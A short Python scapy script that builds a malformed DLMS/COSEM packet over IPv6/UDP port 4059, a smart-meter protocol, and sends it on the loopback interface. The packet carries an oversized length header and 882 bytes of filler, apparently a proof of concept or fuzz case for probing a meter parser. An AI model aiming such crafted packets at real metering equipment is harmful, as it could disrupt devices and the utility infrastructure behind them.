from datetime import datetime
import time
from scapy.all import *

eth = Ether(src="00:15:5d:02:6e:40", dst="00:00:00:00:00:00")
ipv6 = IPv6(src="fe80::211:32ff:fe44:5566", dst="fe80::1")
udp = UDP(sport=4059, dport=4059)

dlms_payload = (
    bytes.fromhex("000100010001037f")  # Wrapper
    + bytes.fromhex("c40281000000000001")  # APDU Header
    + bytes.fromhex("09820372")  # A-XDR Length Header
    + (b"\xaa" * 882)  # Data Payload
)

pkt = eth / ipv6 / udp / Raw(load=dlms_payload)

interface = "lo"
sendp(pkt, iface=interface)
wait_time = 3
n_packets = 1

print(f"Start Time: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
print(f"Packet Size: {len(pkt)} bytes")

for i in range(n_packets):
    print(f"Sending packet {i+1}/{n_packets} via '{interface}'...")
    sendp(pkt, iface=interface)
    if i < n_packets - 1:
        time.sleep(wait_time)

print(f"End Time: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")